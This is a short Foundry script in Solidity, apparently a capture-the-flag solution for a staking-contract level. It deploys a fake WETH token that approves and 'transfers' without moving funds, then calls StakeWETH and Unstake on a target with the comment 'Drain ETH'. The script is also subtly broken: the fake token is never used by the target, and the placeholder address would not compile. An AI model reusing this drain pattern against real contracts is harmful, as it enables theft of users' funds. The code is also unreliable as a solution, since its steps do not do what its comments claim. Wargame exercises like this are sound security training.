// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IStake {
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
}

contract FakeWETH {

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }
}

contract StakeSolution is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // 1. Deploy fake token
        FakeWETH fake = new FakeWETH();

        // 2. Call StakeWETH
        IStake(target).StakeWETH(1 ether);

        // 3. Drain ETH
        IStake(target).Unstake(1 ether);

        vm.stopBroadcast();
    }
}
